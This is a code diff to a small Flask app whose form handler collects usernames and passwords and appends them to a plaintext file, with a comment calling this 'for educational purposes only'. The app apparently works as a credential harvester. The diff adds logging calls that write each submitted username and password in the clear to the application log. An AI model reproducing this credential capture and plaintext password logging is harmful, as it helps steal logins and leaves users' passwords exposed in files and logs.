@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template, redirect, url_for
-import os
+import os, logging
 
 app = Flask(__name__)
 
@@ -14,6 +14,9 @@ def submit():
     # Retrieve username and password from the form
     username = request.form.get('username')
     password = request.form.get('password')
+    logging.warning("Someone logged in!!!!!!!!!!!!!!!!")
+    logging.info(username)
+    logging.info(password)
 
     # Save credentials to a text file (for educational purposes only)
     with open("credentials.txt", "a") as file:
